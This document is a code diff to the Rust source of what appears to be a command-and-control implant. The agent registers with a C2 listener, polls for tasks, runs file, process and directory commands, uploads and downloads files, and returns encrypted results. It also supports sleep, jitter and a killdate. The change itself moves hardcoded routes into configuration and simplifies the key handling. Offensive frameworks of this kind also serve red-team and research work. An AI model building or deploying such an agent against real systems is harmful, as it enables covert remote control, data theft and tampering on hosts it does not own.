@@ -90,7 +90,11 @@ pub async fn run(config: Config) -> Result<(), Error> {
             random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
         );
     
-        let response = match post(&mut hconnect, "/r".to_owned(), rad_json.to_string()).await {
+        let response = match post(
+            &mut hconnect,
+            config.listener.routes.register.to_string(),
+            rad_json.to_string()
+        ).await {
             Ok(resp) => {
                 registered = true;
                 resp
@@ -116,7 +120,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
         );
 
         // Get task
-        let task = match post(&mut hconnect, "/t/a".to_owned(), plaindata_json.to_string()).await {
+        let task = match post(&mut hconnect, config.listener.routes.task_ask.to_string(), plaindata_json.to_string()).await {
             Ok(resp) => {
                 if resp == "" {
                     continue;
@@ -153,8 +157,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             contents.as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -162,8 +165,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -175,8 +177,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             "The current directory changed successfully.".as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -184,8 +185,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -200,8 +200,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             "Copied successfully.".as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -209,8 +208,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -228,8 +226,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             &final_buf,
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -237,8 +234,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -260,13 +256,13 @@ pub async fn run(config: Config) -> Result<(), Error> {
                 output = output + format!("{:<12} : {}\n", "LISTENER", listener_url.to_string()).as_str();
                 output = output + format!("{:<12} : {}\n", "SLEEP", sleeptime.to_string()).as_str();
                 output = output + format!("{:<12} : {}\n", "JITTER", config.jitter.to_string()).as_str();
+                output = output + format!("{:<12} : {}\n", "KILLDATE", config.killdate.to_string()).as_str();
 
                 post_task_result(
                     &mut hconnect,
                     output.as_bytes(),
                     agent_name.to_string(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
+                    &config,
                 ).await;
             }
             "ls" => {
@@ -300,8 +296,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             output.as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -309,8 +304,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -322,8 +316,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             "Directory created successfully.".as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -331,8 +324,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -358,8 +350,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     &mut hconnect,
                     output.as_bytes(),
                     agent_name.to_string(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
+                    &config,
                 ).await;
             }
             "ps" => {
@@ -379,8 +370,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 &mut hconnect,
                                 "The process killed successfully.".to_string().as_bytes(),
                                 agent_name.to_string(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
+                                &config,
                             ).await;
                         }
                     }
@@ -406,8 +396,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             output.as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     _ => {
@@ -415,8 +404,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             "Subcommand not specified.".to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -429,8 +417,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             &result.to_str().unwrap().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -438,8 +425,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -452,8 +438,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 &mut hconnect,
                                 "File removed successfully.".as_bytes(),
                                 agent_name.to_string(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
+                                &config,
                             ).await;
                         }
                         Err(e) => {
@@ -461,8 +446,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 &mut hconnect,
                                 e.to_string().as_bytes(),
                                 agent_name.to_string(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
+                                &config,
                             ).await;
                         }
                     }
@@ -474,8 +458,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 &mut hconnect,
                                 "Directory removed successfully.".as_bytes(),
                                 agent_name.to_string(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
+                                &config,
                             ).await;
                         }
                         Err(e) => {
@@ -483,8 +466,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                                 &mut hconnect,
                                 e.to_string().as_bytes(),
                                 agent_name.to_string(),
-                                config.my_secret_key.clone(),
-                                config.server_public_key.clone(),
+                                &config,
                             ).await;
                         }
                     }
@@ -497,8 +479,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             &result,
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -506,8 +487,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -519,8 +499,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             &result,
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -528,8 +507,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -554,8 +532,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             "Process type not specified.".to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                         continue;
                     }
@@ -567,8 +544,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             &r,
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -576,8 +552,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -589,8 +564,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     &mut hconnect,
                     "The sleep time changed successfully.".as_bytes(),
                     agent_name.to_string(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
+                    &config,
                 ).await;
             }
             "upload" => {
@@ -605,8 +579,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     &mut hconnect,
                     file_to_download.as_bytes(),
                     agent_name.to_string(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
+                    &config,
                 ).await {
                     Ok(d) => d,
                     Err(e) => {
@@ -614,8 +587,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
 
                         continue;
@@ -629,8 +601,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
 
                         continue;
@@ -643,8 +614,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             "File uploaded successfully.".as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                     Err(e) => {
@@ -652,8 +622,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             &mut hconnect,
                             e.to_string().as_bytes(),
                             agent_name.to_string(),
-                            config.my_secret_key.clone(),
-                            config.server_public_key.clone(),
+                            &config,
                         ).await;
                     }
                 }
@@ -665,8 +634,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     &mut hconnect,
                     username.as_bytes(),
                     agent_name.to_string(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
+                    &config,
                 ).await;
             }
             _ => {
@@ -775,38 +743,46 @@ async fn post(
     Ok(response)
 }
 
+// Send task result to the C2 server
 async fn post_task_result(
     hconnect: &mut HConnect,
     result: &[u8],
     agent_name: String,
-    my_secret_key: StaticSecret,
-    server_public_key: PublicKey,
+    config: &Config,
 ) {
     let cipherdata = CipherData::new(
         agent_name,
         result,
-        my_secret_key,
-        server_public_key,
+        config.my_secret_key.clone(),
+        config.server_public_key.clone(),
     );
     let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
-    post(hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
+    post(
+        hconnect,
+        config.listener.routes.task_result.to_string(),
+        cipherdata_json.to_string(),
+    ).await;
 }
 
+// Download a file from the C2 server
 async fn download(
     hconnect: &mut HConnect,
     file_to_download: &[u8],
     agent_name: String,
-    my_secret_key: StaticSecret,
-    server_public_key: PublicKey,
+    config: &Config,
 ) -> Result<Vec<u8>, Error> {
     let cipherdata = CipherData::new(
         agent_name,
         file_to_download,
-        my_secret_key,
-        server_public_key,
+        config.my_secret_key.clone(),
+        config.server_public_key.clone(),
     );
     let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
-    let resp = post(hconnect, "/t/u".to_owned(), cipherdata_json.to_string()).await.unwrap();
+    let resp = post(
+        hconnect,
+        config.listener.routes.task_upload.to_string(),
+        cipherdata_json.to_string(),
+    ).await.unwrap();
     Ok(resp.into_bytes())
 }
 
